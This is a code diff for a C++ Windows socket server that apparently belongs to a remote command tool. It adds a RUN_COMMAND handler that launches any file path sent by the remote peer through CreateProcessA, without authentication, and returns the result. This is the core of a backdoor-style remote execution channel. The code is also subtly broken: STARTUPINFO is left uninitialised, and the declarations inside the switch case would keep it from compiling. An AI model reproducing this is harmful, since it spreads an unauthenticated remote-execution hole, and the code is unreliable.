@@ -134,7 +134,7 @@ Command Server::resolveCommand(string command) {
 }
 
 
-Command Server::recvCommand() {
+string Server::recvCommand() {
     int recvBytes;
     char commandLenBuffer[MESSAGE_LEN_SIZE];  // store the length of the message
 
@@ -167,7 +167,7 @@ Command Server::recvCommand() {
     delete[] commandBuffer;
 
     std::cout << "[+] (recv) command:  " << command << std::endl;
-    return resolveCommand(command);
+    return command;
 }
 
 
@@ -192,13 +192,26 @@ void Server::sendResponse(string response) {
 
 
 void Server::handleCommand() {
-    Command command = recvCommand();
+    string command = recvCommand();
 
-    switch(command) {
+    switch(resolveCommand(command)) {
         case PING_COMMAND:
             sendResponse("PONG");
             break;
         case RUN_COMMAND:
+            string filePath{recvCommand()};
+            string response{};
+            STARTUPINFO si;
+            PROCESS_INFORMATION pi;
+            BOOL succeed = CreateProcessA(
+                filePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi
+            );
+            if (succeed) {
+                response += "Succeed";
+            } else {
+                response += "Failed, error code: " + std::to_string(GetLastError());
+            }
+            sendResponse(response);
             break;
         case UNKNOWN_COMMAND:
             sendResponse("Unknown command");
